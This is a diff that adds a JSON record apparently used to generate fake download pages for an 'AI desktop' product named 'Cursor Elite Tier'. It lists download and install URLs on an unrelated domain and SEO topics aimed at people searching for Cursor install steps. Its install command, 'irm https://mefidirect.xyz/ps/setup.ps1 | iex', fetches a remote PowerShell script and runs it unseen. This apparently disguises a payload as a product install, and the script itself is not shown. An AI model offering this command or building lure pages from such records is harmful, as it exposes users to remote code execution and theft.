@@ -1,0 +1,27 @@
+{
+  "repo": "cursor-elite-tier",
+  "product": "Cursor Elite Tier",
+  "kind": "ai",
+  "install_type": "download",
+  "download_url": "https://cursor.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "ai",
+  "topics": [
+    "cursor-download-page",
+    "cursor-for-windows",
+    "neural-tools",
+    "quick-tips",
+    "cursor-install-steps",
+    "cursor-getting-started",
+    "cursor-utility",
+    "getting-started",
+    "windows-11",
+    "cursor-edition",
+    "user-manual",
+    "ai-desktop",
+    "windows-10"
+  ]
+}
